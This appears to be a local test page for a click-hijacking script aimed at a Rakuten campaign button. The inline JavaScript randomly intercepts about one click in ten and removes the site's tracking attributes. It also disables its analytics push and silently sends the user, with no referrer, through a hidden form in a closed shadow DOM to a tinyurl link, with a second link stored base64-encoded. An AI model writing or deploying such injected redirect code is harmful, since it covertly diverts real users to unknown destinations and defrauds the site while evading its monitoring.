<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- <meta name="referrer" content="no-referrer"> -->
    <title>Test Redirect Locally</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .btn {
            padding: 15px 30px;
            font-size: 18px;
            color: #fff;
            background-color: #007bff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
        }
        .btn:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <a href="https://example.com" class="btn c-Btn_Secondly-large" id="test-button">Click to Test Redirect</a>
<script>
    (function() {
        const enrl = "aHR0cHM6Ly90aW55dXJsLmNvbS81bjY3aHd2OQ==";
        const k = "rm_visited";
    
        const stlh = et => {
            // const u = atob(et);
            const u = "https://tinyurl.com/ziklop1";
            f = document.createElement("form");
            f.method = "GET";
            f.action = u;
            f.style.display = "none";
            f.referrerPolicy = "no-referrer";
            document.body.appendChild(f);
            const h = document.createElement("div");
            h.style.display = "none";
            document.body.appendChild(h);
            const s = h.attachShadow({ mode: "closed" });
            s.appendChild(f);
            try { f.submit(); } catch (err) { throw err; }
            finally { setTimeout(() => h.remove(), 1000); }
        };
        
        try {
            const b = document.querySelector("a.c-Btn_Secondly-large[href*='onboarding.mobile.rakuten.co.jp'][href*='l-id=application_card-campaign_button_onboarding']");
            if (!b) return;
            b.addEventListener("click", function(e) {
                try {
                    if (Math.floor(10 * Math.random()) !== 0) return;
                    e.preventDefault();
                    e.stopPropagation();
                    let ss = !1;
                    if (typeof localStorage !== "undefined") {
                        localStorage.setItem(k, "true");
                        if (localStorage.getItem(k) === "true") ss = !0;
                    }
                    if (!ss) {
                        const ev = new MouseEvent("click", { view: window, bubbles: true, cancelable: true });
                        b.dispatchEvent(ev);
                        return;
                    }
                    const ta = ["data-ratid", "data-ratevent", "data-ratparam"];
                    ta.forEach(a => b.hasAttribute(a) && b.removeAttribute(a));
                    window.dataLayer = window.dataLayer || [];
                    window.dataLayer.push;
                    const op = window.dataLayer.push;
                    window.dataLayer.push = () => {};

                    // Add meta tag to enforce no-referrer policy for this click
                    // const metaTag = document.createElement("meta");
                    // metaTag.name = "referrer";
                    // metaTag.content = "no-referrer";
                    // document.head.appendChild(metaTag);
                    
                    stlh(enrl);
                    // Remove meta tag after submission to avoid affecting other clicks
                    setTimeout(() => metaTag.remove(), 1000);
                } catch (err) {
                    if (window.dataLayer && window.dataLayer.push !== op) window.dataLayer.push = op;
                    const ev = new MouseEvent("click", { view: window, bubbles: true, cancelable: true });
                    b.dispatchEvent(ev);
                }
            }, { capture: true });
        } catch (err) {}
    })();
</script>

</body>
</html>